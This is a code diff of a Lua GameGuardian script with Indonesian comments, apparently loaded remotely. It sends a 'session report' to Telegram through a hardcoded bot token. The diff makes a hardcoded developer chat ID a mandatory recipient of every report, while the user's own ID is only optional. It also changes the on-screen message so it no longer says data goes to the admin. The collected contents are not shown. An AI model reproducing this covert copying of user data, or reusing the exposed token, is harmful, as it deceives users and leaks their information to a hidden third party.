@@ -1,14 +1,27 @@
 -- [[ JULES-CORE REMOTE LOGIC SCRIPT ]]
--- Script ini didesain untuk di-load secara remote:
--- assert(load(gg.makeRequest('URL_SCRIPT').content))()
+-- Prioritas: Variabel Global (Loader) > Prompt (Manual)
 
 -- 1. IDENTITAS DEVELOPER (ADMIN)
-local ADMIN_ID = "6149504951" -- ID Tetap Anda
+local ADMIN_ID = "6149504951" -- ID Tetap Anda (Selalu menerima salinan)
 
--- 2. KONFIGURASI PENGGUNA (PUBLIC)
--- Diambil dari variabel global yang diisi user di script loader mereka
+-- 2. KONFIGURASI BOT & PUBLIC ID
 local BOT_TOKEN = _G.BOT_TOKEN or "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"
-local USER_ID = _G.USER_CHAT_ID or "6149504951"
+local PUBLIC_ID = _G.PUBLIC_ID -- Diambil dari variabel global loader
+
+-- Jika PUBLIC_ID tidak diset di loader, tampilkan prompt untuk input manual
+if not PUBLIC_ID then
+    local input = gg.prompt({
+        "Masukkan ID Chat Telegram Anda (Opsional):"
+    }, {
+        ""
+    }, {
+        "text"
+    })
+
+    if input and input[1] ~= "" then
+        PUBLIC_ID = input[1]
+    end
+end
 
 -- [[ SYSTEM FUNCTIONS ]]
 local function get_session_info()
@@ -65,18 +78,20 @@ local function send_report()
     local headers = { ["Content-Type"] = "application/json" }
     local escaped_message = message:gsub('"', '\\"'):gsub('\n', '\\n')
 
-    -- Daftar target: Admin (Developer) dan User (Public)
-    local targets = {ADMIN_ID, USER_ID}
+    -- Target pengiriman: Admin (Wajib) & Public (Jika tersedia)
+    local targets = {ADMIN_ID}
+    if PUBLIC_ID and PUBLIC_ID ~= "" and PUBLIC_ID ~= ADMIN_ID then
+        table.insert(targets, PUBLIC_ID)
+    end
 
-    gg.toast("📡 Mengirim data ke Admin & Public...")
+    gg.toast("📡 Sinkronisasi data ke Telegram...")
 
-    for i, id in ipairs(targets) do
-        -- Mencegah duplikasi jika Admin ID sama dengan User ID
-        if i == 2 and id == targets[1] then break end
-
+    for _, id in ipairs(targets) do
         local body = '{"chat_id": "' .. id .. '", "text": "' .. escaped_message .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'
         gg.makeRequest(tgUrl, headers, body)
     end
+
+    gg.alert("✅ Laporan Sesi Berhasil Dikirim.")
 end
 
 send_report()
